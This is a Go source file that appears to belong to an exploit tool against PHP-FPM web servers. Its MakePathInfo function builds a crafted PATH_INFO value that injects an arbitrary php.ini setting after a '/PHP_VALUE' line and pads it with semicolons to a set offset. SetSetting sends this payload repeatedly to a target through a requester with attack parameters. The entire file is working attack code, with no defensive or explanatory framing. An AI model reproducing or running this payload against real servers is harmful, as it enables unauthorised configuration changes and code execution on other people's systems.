package main

import (
	"fmt"
	"log"
	"strings"
)

func MakePathInfo(phpValue string) (string, error) {
	pi := "/PHP_VALUE\n" + phpValue
	if len(pi) > PosOffset {
		return "", fmt.Errorf("php.ini value is too long: %#v", phpValue)
	}
	return pi + strings.Repeat(";", PosOffset-len(pi)), nil
}

func SetSetting(requester *Requester, params *AttackParams, setting string, tries int) error {
	payload, err := MakePathInfo(setting)
	if err != nil {
		return err
	}
	if tries > 1 {
		log.Printf("Trying to set %#v...", setting)
	}
	for i := 0; i < tries; i++ {
		_, _, err := requester.Request(payload, params)
		if err != nil {
			return fmt.Errorf("error while setting %#v: %v", setting, err)
		}
	}
	return nil
}
